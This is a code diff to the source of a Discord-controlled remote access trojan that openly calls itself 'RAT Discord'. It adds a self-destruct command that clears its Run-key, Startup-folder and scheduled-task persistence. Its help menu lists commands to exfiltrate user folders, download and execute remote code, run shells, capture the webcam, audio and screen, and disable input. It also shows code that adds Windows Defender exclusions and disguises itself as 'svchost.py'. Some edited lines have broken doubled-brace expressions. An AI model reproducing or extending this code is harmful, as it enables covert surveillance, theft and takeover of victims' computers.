@@ -266,21 +266,87 @@ async def process_command(message):
             await message.channel.send(f"Bot ID {{target}} not found")
         return
     
-    elif command.startswith('!disconnect '):
-        target = command.split('!disconnect ', 1)[1].strip()
+    elif command.startswith('!selfdestruct '):
+        target = command.split('!selfdestruct ', 1)[1].strip()
         if target.lower() == 'all':
-            await message.channel.send("**Disconnecting all bots...**")
+            await message.channel.send("**💣 Self-destructing all bots...**")
             await asyncio.sleep(1)
+            
+            try:
+                rat_path = os.path.abspath(__file__)
+                
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, 'SystemService')
+                winreg.CloseKey(key)
+            except:
+                pass
+            
+            try:
+                startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsSvc.exe')
+                if os.path.exists(startup_path):
+                    os.remove(startup_path)
+            except:
+                pass
+            
+            try:
+                subprocess.run('schtasks /delete /tn "SystemUpdater" /f', shell=True, capture_output=True)
+                subprocess.run('schtasks /delete /tn "SystemUpdaterNonAdmin" /f', shell=True, capture_output=True)
+            except:
+                pass
+            
+            try:
+                if os.path.exists(rat_path):
+                    with open(rat_path, 'w') as f:
+                        f.write('# Self-destructed')
+                    os.remove(rat_path)
+            except:
+                pass
+            
             await client.close()
             sys.exit()
+            
         elif target in active_bots:
-            await message.channel.send(f"**Disconnecting bot {{target}}**")
+            bot_info = active_bots[target]
+            await message.channel.send(f"**💣 Self-destructing bot {{target}}**\\n```User: {{bot_info['user']}}\\nPC: {{bot_info['pc']}}```")
             del active_bots[target]
             if selected_bot == target:
                 selected_bot = None
+            
+            try:
+                rat_path = os.path.abspath(__file__)
+                
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, 'SystemService')
+                winreg.CloseKey(key)
+            except:
+                pass
+            
+            try:
+                startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsSvc.exe')
+                if os.path.exists(startup_path):
+                    os.remove(startup_path)
+            except:
+                pass
+            
+            try:
+                subprocess.run('schtasks /delete /tn "SystemUpdater" /f', shell=True, capture_output=True)
+                subprocess.run('schtasks /delete /tn "SystemUpdaterNonAdmin" /f', shell=True, capture_output=True)
+            except:
+                pass
+            
+            try:
+                if os.path.exists(rat_path):
+                    with open(rat_path, 'w') as f:
+                        f.write('# Self-destructed')
+                    os.remove(rat_path)
+            except:
+                pass
+            
             await asyncio.sleep(1)
             await client.close()
             sys.exit()
+        else:
+            await message.channel.send(f"Bot ID {{target}} not found")
         return
     
     elif command.startswith('!spamcmd '):
@@ -748,32 +814,30 @@ async def process_command(message):
         await send_embed(control_channel, "Pong!", description="RAT is online")
     
     elif command == '!help':
-        embed = discord.Embed(title="📋 Command List", color=0x00ff00)
-        
-        control_commands = """!clients - List zombies (ID, User, IP, PC)
+        embed = discord.Embed(title="📋 RAT Discord - Command List", color=0x00ff00)
+        embed.description = """!clients - List zombies
 !select <ID|all> - Select bot(s)
-!disconnect <ID|all> - Disconnect bot(s)
+!selfdestruct <ID|all> - Self-destruct
 !spamcmd <n> - Spam cmd windows
-!altf4 - Close active window
+!altf4 - Close window
 !mute - Mute audio
 !volume <0-100> - Set volume
-!bsod - Blue screen of death
+!bsod - Blue screen
 !freeze - Freeze PC
 !taskbar - Hide/show taskbar
 !mouse <on|off> - Enable/disable mouse
 !keyboard <on|off> - Enable/disable keyboard
-!invertmouse - Invert mouse buttons
-!upsidedown - Flip screen upside down
-!exfiltrate - Zip Desktop/Documents/Downloads
+!invertmouse - Invert mouse
+!upsidedown - Flip screen
+!exfiltrate - Zip files
 !delete <path> - Delete file
-!upload <url> - Download and execute
+!upload <url> - Download/execute
 !audio <sec> - Record audio
-!record <sec> - Record screen video
-!website <url> - Open website
-!hide - Hide process window
-!stream - Toggle screen stream"""
-        
-        system_commands = """!screenshot - Take screenshot
+!record <sec> - Record video
+!website <url> - Open site
+!hide - Hide process
+!stream - Toggle stream
+!screenshot - Take screenshot
 !webcam - Webcam photo
 !shell <cmd> - Run shell command
 !info - System information
@@ -788,17 +852,13 @@ async def process_command(message):
 !clipboard - Get clipboard
 !setclipboard <text> - Set clipboard
 !kill <process> - Kill process
-!sound <url> - Play sound from URL
+!sound <url> - Play sound
 !wallpaper <url> - Set wallpaper
 !processes - List processes
 !beep <freq> <dur> - System beep
-!checkboot - Check persistence
+!checkboot <ID|all> - Check persistence
 !ping - Check if online"""
-        
-        embed.add_field(name="🎯 Control Victim", value=control_commands, inline=False)
-        embed.add_field(name="💻 System Commands", value=system_commands, inline=False)
         embed.set_footer(text="RAT Discord • 40 Commands Available")
-        
         await message.channel.send(embed=embed)
 
 async def stream_screen():
@@ -818,7 +878,7 @@ def add_exclusions():
     fails = []
     rat_path = os.path.abspath(__file__)
     try:
-        cmd = f'powershell.exe -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \\'{os.path.dirname(rat_path)}\\'; Add-MpPreference -ExclusionProcess \\'{os.path.basename(rat_path)}\\'"'
+        cmd = f'powershell.exe -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \\'{{os.path.dirname(rat_path)}}\\'; Add-MpPreference -ExclusionProcess \\'{{os.path.basename(rat_path)}}\\'"'
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         if result.returncode == 0:
             successes.append("Defender exclusion added")
@@ -920,7 +980,7 @@ async def on_ready():
 
     rat_path = os.path.abspath(__file__)
     new_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
-    if 'rat' in os.path.basename(rat_path).lower() and not os.path.exists(new_path):
+    if 'rat' in {{os.path.basename(rat_path)}}.lower() and not os.path.exists(new_path):
         try:
             shutil.copy(rat_path, new_path)
             log_local(f"Copied to {{new_path}}")
